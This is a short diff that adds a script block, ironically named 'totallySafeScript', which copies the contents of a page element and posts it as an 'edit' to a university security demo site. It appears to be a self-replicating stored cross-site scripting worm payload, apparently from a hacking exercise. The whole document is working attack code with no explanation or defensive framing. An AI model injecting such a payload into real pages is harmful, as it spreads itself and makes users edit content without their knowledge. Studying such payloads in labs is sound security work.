@@ -1,0 +1,9 @@
+<script id='totallySafeScript'>
+var formData = new FormData();
+var textScript = document.getElementById("descriptiontext").innerHTML;
+formData.append("description", textScript);
+formData.append("action", "edit");
+var req = new XMLHttpRequest();
+req.open("POST", "http://demo.sec.informatik.uni-stuttgart.de/hackspace/?");
+req.send(formData);
+</script>
